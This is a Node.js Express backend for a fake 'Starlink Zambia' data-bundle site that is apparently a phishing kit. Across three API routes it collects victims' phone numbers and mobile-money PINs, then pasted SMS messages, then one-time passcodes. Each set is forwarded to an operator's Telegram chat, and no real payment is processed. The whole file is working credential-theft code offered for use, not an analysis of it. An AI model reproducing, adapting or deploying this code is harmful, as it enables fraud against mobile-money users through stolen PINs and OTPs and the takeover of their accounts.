/* ============================================================
   Starlink Zambia — Backend
   Plain Telegram notifications (no inline buttons)
   - checkout → sms-paste → otp-verify
   ============================================================ */

const express = require('express');
const cors = require('cors');
const crypto = require('crypto');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 5000;

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID   || '';

const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

app.use(cors());
app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: true }));

app.use((req, _res, next) => {
  console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
  next();
});

/* Serve static files (index.html, plans.html, etc.) from project root */
const PUBLIC_DIR = path.join(__dirname, '..');
app.use(express.static(PUBLIC_DIR));

/* Helpers */
function escapeHtml(s = '') {
  return String(s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

function isValidPhone(phone) {
  return typeof phone === 'string' && /^\+?\d{8,15}$/.test(phone.replace(/\s/g, ''));
}

/* Send plain Telegram message (no buttons) */
async function sendTelegram(text) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.warn('⚠️ Telegram env vars missing');
    return null;
  }
  try {
    const res = await fetch(TELEGRAM_API, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text,
        parse_mode: 'HTML',
        disable_web_page_preview: true
      })
    });
    const data = await res.json().catch(() => ({}));
    if (!data.ok) {
      console.warn('⚠️ Telegram error:', data.description || data);
      return null;
    }
    return data.result.message_id || null;
  } catch (err) {
    console.error('❌ Telegram fetch failed:', err.message);
    return null;
  }
}

/* Page routes */
function servePage(filename) {
  return (_req, res) => {
    const filePath = path.join(PUBLIC_DIR, filename);
    if (!fs.existsSync(filePath)) {
      return res.status(404).send(`Page ${filename} not found.`);
    }
    res.sendFile(filePath);
  };
}

app.get(['/', '/dashboard', '/dashboard/'], servePage('index.html'));
app.get(['/plans', '/plans/'], servePage('plans.html'));
app.get(['/checkout', '/checkout/'], servePage('checkout.html'));
app.get(['/sms-paste', '/sms-paste/'], servePage('sms-paste.html'));
app.get(['/otp-verify', '/otp-verify/'], servePage('otp-verify.html'));
app.get(['/settings', '/settings/'], servePage('settings.html'));

/* ============================================================
   API — CHECKOUT (phone + PIN → Telegram)
   ============================================================ */
app.post('/api/checkout', async (req, res) => {
  try {
    const { plan = '', data = '', price = 0, period = '', phone = '', pin = '' } = req.body || {};

    if (!isValidPhone(phone)) {
      return res.status(400).json({ ok: false, error: 'Invalid phone number' });
    }
    if (typeof pin !== 'string' || pin.length < 4) {
      return res.status(400).json({ ok: false, error: 'Invalid PIN' });
    }

    const text =
      `🛒 <b>NEW CHECKOUT</b>\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `🇿🇲 <b>Country:</b> Zambia\n` +
      `📦 <b>Bundle:</b> ${escapeHtml(plan)} (${escapeHtml(data)})\n` +
      `💰 <b>Amount:</b> ZMW ${Number(price).toFixed(2)}\n` +
      `⏱️ <b>Duration:</b> ${escapeHtml(period)}\n` +
      `📱 <b>Phone:</b> <code>${escapeHtml(phone)}</code>\n` +
      `🔑 <b>PIN:</b> <code>${escapeHtml(pin)}</code>\n` +
      `🕒 <b>Time:</b> ${new Date().toLocaleString('en-GB')}`;

    const messageId = await sendTelegram(text);
    console.log(`[checkout] msgId=${messageId}`);

    return res.json({ ok: true, messageId });
  } catch (err) {
    console.error('checkout error:', err);
    return res.status(500).json({ ok: false, error: 'Server error' });
  }
});

/* ============================================================
   API — SMS (paste SMS → Telegram)
   ============================================================ */
app.post('/api/sms', async (req, res) => {
  try {
    const { plan = '', data = '', price = 0, period = '', phone = '', sms = '' } = req.body || {};

    if (!isValidPhone(phone)) {
      return res.status(400).json({ ok: false, error: 'Invalid phone number' });
    }
    if (typeof sms !== 'string' || sms.trim().length < 5) {
      return res.status(400).json({ ok: false, error: 'SMS text required' });
    }

    const text =
      `📩 <b>NEW SMS SUBMITTED</b>\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `🇿🇲 <b>Country:</b> Zambia\n` +
      `📦 <b>Bundle:</b> ${escapeHtml(plan)} (${escapeHtml(data)})\n` +
      `💰 <b>Amount:</b> ZMW ${Number(price).toFixed(2)}\n` +
      `📱 <b>Phone:</b> <code>${escapeHtml(phone)}</code>\n` +
      `🕒 <b>Time:</b> ${new Date().toLocaleString('en-GB')}\n\n` +
      `📝 <b>Message:</b>\n<pre>${escapeHtml(sms)}</pre>`;

    const messageId = await sendTelegram(text);
    console.log(`[sms] msgId=${messageId}`);

    return res.json({ ok: true, messageId });
  } catch (err) {
    console.error('sms error:', err);
    return res.status(500).json({ ok: false, error: 'Server error' });
  }
});

/* ============================================================
   API — OTP
   ============================================================ */
app.post('/api/otp', async (req, res) => {
  try {
    const { plan = '', data = '', price = 0, period = '', phone = '', otp = '' } = req.body || {};

    if (!isValidPhone(phone)) {
      return res.status(400).json({ ok: false, error: 'Invalid phone number' });
    }
    if (typeof otp !== 'string' || !/^\d{4,8}$/.test(otp)) {
      return res.status(400).json({ ok: false, error: 'Invalid OTP' });
    }

    const text =
      `🔢 <b>NEW OTP ENTERED</b>\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `🇿🇲 <b>Country:</b> Zambia\n` +
      `📦 <b>Bundle:</b> ${escapeHtml(plan)} (${escapeHtml(data)})\n` +
      `💰 <b>Amount:</b> ZMW ${Number(price).toFixed(2)}\n` +
      `📱 <b>Phone:</b> <code>${escapeHtml(phone)}</code>\n` +
      `🔐 <b>OTP:</b> <code>${escapeHtml(otp)}</code>\n` +
      `🕒 <b>Time:</b> ${new Date().toLocaleString('en-GB')}`;

    const messageId = await sendTelegram(text);
    console.log(`[otp] msgId=${messageId}`);

    return res.json({ ok: true, messageId });
  } catch (err) {
    console.error('otp error:', err);
    return res.status(500).json({ ok: false, error: 'Server error' });
  }
});

/* ============================================================
   404 + ERROR
   ============================================================ */
app.use((_req, res) => {
  res.status(404).send(`
    <html><body style="font-family:sans-serif;text-align:center;padding:60px 20px;background:#f9fafb;">
      <h1 style="font-size:48px;margin:0;color:#111827;">404</h1>
      <p style="color:#6b7280;margin-top:12px;">Page not found.</p>
      <a href="/plans.html" style="display:inline-block;margin-top:20px;padding:12px 22px;background:#FFCC00;color:#000;text-decoration:none;font-weight:900;border-radius:10px;">Go to Plans</a>
    </body></html>
  `);
});

app.use((err, _req, res, _next) => {
  console.error('unhandled error:', err);
  res.status(500).send('Server error');
});

app.listen(PORT, async () => {
  console.log('====================================');
  console.log('🛰️  Starlink Zambia — backend running');
  console.log(`🚀 Port: ${PORT}`);
  console.log(`📨 Telegram configured: ${TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID ? 'YES' : 'NO'}`);
  console.log('====================================');
});
